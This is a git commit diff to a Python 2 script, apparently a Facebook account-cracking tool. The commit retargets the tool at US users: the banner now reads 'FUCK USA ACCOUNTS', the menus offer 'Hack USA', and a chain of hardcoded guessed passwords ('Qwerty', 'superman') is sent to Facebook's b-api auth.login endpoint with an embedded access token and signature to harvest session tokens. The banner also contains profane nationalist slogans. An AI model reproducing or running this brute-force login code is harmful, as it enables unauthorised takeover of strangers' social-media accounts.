55647f88861e8aaab03e50c59c26bdc440ffe307
Rana Aahil <62800395+TheAahil@users.noreply.github.com>
2020-04-08 00:39:22 -0700

    Update india.py

--- india.py
+++ india.py
@@ -47,18 +47,19 @@ def jalan(z):
 
 
 #### LOGO ####
-logo = """\033[1;35m█████████
-\033[1;35m█▄█████▄█      \033[1;91m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●
-\033[1;35m█\033[1;92m▼▼▼▼▼ \033[1;92m- _ --_--\033[0;31m╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗
-\033[1;35m█ \033[1;92m \033[1;92m_-_-- -_ --__\033[0;32m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗
-\033[1;35m█\033[1;92m▲▲▲▲▲\033[1;92m--  - _ --\033[0;37m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝ \033[0;32  ASMART \033[0;37  TIPS
-\033[1;35m█████████      \033[1;91m«----------✧----------»
-\033[1;35m ██ ██
-\033[0;31m╔════════════════════════════════════════════╗
-\033[0;31m║\033[0;36m* \033[0;36mAuthor  \033[1;36m : \033[1;31mHACKR•|A.SMART.TIPS\033[0;31m            ║
-\033[0;31m║\033[0;36m* \033[0;36mGitHub  \033[1;36m : \033[1;31m\033[4mhttps://Github.com/ASmartTips\033[0m \033[0;31m ║
-\033[0;31m║\033[0;36m* \033[0;36mWhatsApp \033[1;36m: \033[1;31m0856-9101-5635\033[0;31m                   ║
-\033[0;31m╚════════════════════════════════════════════╝"""
+logo = """
+\033[1;35m███████╗░░░░░░██╗░░░██╗░██████╗░█████╗░
+\033[1;31m██╔════╝░░░░░░██║░░░██║██╔════╝██╔══██╗    FUCK USA ACCOUNTS 🔥
+\033[1;35m█████╗░░█████╗██║░░░██║╚█████╗░███████║   WE ARE PAKISTANIS 🔥
+\033[1;33m██╔══╝░░╚════╝██║░░░██║░╚═══██╗██╔══██║    WE HAVE ANYMOUSE POWER 🔥
+\033[1;39m██║░░░░░░░░░░░╚██████╔╝██████╔╝██║░░██║    WE HAVE CYBER POWER 🔥
+\033[1;31m╚═╝░░░░░░░░░░░░╚═════╝░╚═════╝░╚═╝░░╚═╝
+
+║══════════════════╔════════════════════════════════════════════╗══════════════════║
+║══════════════════║   \033[0;31m║═══IM NOT RESPONSIBLE FOR ANY MISS USE════║   ║══════════════════║
+║══════════════════║   \033[0;32m║═══USE THIS COMMANDS TO USA FB ACCOUNTS═══║   ║══════════════════║
+║══════════════════║   \033[0;33m║═══VIST MY YOUTUBE CHNEL AAHIL CREATIONS══║   ║══════════════════║
+║══════════════════╚════════════════════════════════════════════╝══════════════════║"
 
 def tik():
 	titik = ['.   ','..  ','... ']
@@ -126,7 +127,6 @@ def login():
 		url = br.geturl()
 		if 'save-device' in url:
 			try:
-				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
 				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
 				x=hashlib.new("md5")
 				x.update(sig)
@@ -187,8 +187,8 @@ def menu():
 	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m Nama \033[1;91m: \033[1;92m"+nama+"\033[1;97m               "
 	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
 	print 42*"\033[1;96m="
-	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;36m Hack Fb MBF"
-	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;36m Group ki list dekho               "
+	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;36m Hack USA"
+	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;36m Group ki list dekho        "
 	print "\x1b[1;96m[\x1b[1;92m4\x1b[1;96m]\x1b[1;36m Yahoo clone               "
 	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Logout            "
 	pilih()
@@ -227,10 +227,10 @@ def super():
 	os.system('clear')
 	print logo
 	print 42*"\033[1;96m="
-	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;36m Apni id ki friend list hack"
-	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;36m Apny dost ki friend list hack"
-	print "\x1b[1;96m[\x1b[1;92m3\x1b[1;96m]\x1b[1;36m Apny facebook group ko hack kro"
-	print "\x1b[1;96m[\x1b[1;92m4\x1b[1;96m]\x1b[1;36m list bana k hack kro"
+	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;37m Apni id ki friend list hack"
+	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;39m USA Account hack"
+	print "\x1b[1;96m[\x1b[1;92m3\x1b[1;96m]\x1b[1;32m Apny facebook group ko hack kro"
+	print "\x1b[1;96m[\x1b[1;92m4\x1b[1;96m]\x1b[1;31m list bana k hack kro"
 	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Back"
 	pilih_super()
 
@@ -378,7 +378,7 @@ def pilih_super():
 											cek.close()
 											cekpoint.append(user+pass4)
 										else:
-											pass5 = ('indian')
+											pass5 = ('Qwerty')
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q = json.load(data)
 											if 'access_token' in q:
@@ -392,7 +392,7 @@ def pilih_super():
 													cek.close()
 													cekpoint.append(user+pass5)
 												else:
-													pass6 = ('indian123')
+													pass6 = ('123qw')
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
@@ -408,7 +408,7 @@ def pilih_super():
 														else:
 															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 															b = json.loads(a.text)
-															pass7 = ('india123')
+															pass7 = ('Ashely')
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q = json.load(data)
 															if 'access_token' in q:
@@ -424,7 +424,7 @@ def pilih_super():
 																else:
 																	a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 																	b = json.loads(a.text)
-																	pass8 = ('bhagwan')
+																	pass8 = ('superman')
 																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 																	q = json.load(data)
 																	if 'access_token' in q:
